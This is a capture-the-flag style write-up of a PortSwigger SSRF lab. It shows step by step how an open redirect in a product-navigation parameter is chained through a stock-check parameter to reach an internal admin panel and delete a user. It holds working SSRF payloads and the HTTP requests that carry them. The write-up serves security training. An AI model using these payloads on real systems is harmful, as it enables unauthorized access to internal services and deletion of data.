
# 9 - SSRF with filter bypass via open redirection vulnerability

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://192.168.0.12:8080/admin and delete the user carlos.

The stock checker has been restricted to only access the local application, so you will need to find an open redirect affecting the application first.


---------------------------------------------

Reference: https://portswigger.net/web-security/ssrf



![img](images/SSRF%20with%20filter%20bypass%20via%20open%20redirection%20vulnerability/1.png)



---------------------------------------------

Generated link: https://0abd004b03b8fa4e80328aba002a00f0.web-security-academy.net



![img](images/SSRF%20with%20filter%20bypass%20via%20open%20redirection%20vulnerability/2.png)

POST request with data “stockApi=/product/stock/check?productId=1&storeId=1”



![img](images/SSRF%20with%20filter%20bypass%20via%20open%20redirection%20vulnerability/3.png)


The endpoint is reachable through a GET request in https://0abd004b03b8fa4e80328aba002a00f0.web-security-academy.net/product/stock/check?productId=1&storeId=1 as well:



![img](images/SSRF%20with%20filter%20bypass%20via%20open%20redirection%20vulnerability/4.png)

There is a “Next product” button:



![img](images/SSRF%20with%20filter%20bypass%20via%20open%20redirection%20vulnerability/5.png)

It uses the “path” parameter to set the id of the next product to display and redirecto to that page:



![img](images/SSRF%20with%20filter%20bypass%20via%20open%20redirection%20vulnerability/6.png)

We test the folowing payload and find the open redirection:

```
/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin
```



![img](images/SSRF%20with%20filter%20bypass%20via%20open%20redirection%20vulnerability/7.png)

Now we will create a new POST request using this payload as the stockApi parameter:

```
POST /product/stock HTTP/2
...

stockApi=/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin
```



![img](images/SSRF%20with%20filter%20bypass%20via%20open%20redirection%20vulnerability/8.png)

Reading the HTML code we see the user carlos can be deleted with a GET request like http://192.168.0.12:8080/admin/delete?username=carlos



![img](images/SSRF%20with%20filter%20bypass%20via%20open%20redirection%20vulnerability/9.png)

```
POST /product/stock HTTP/2
...

stockApi=/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin/delete?username=carlos
```



![img](images/SSRF%20with%20filter%20bypass%20via%20open%20redirection%20vulnerability/10.png)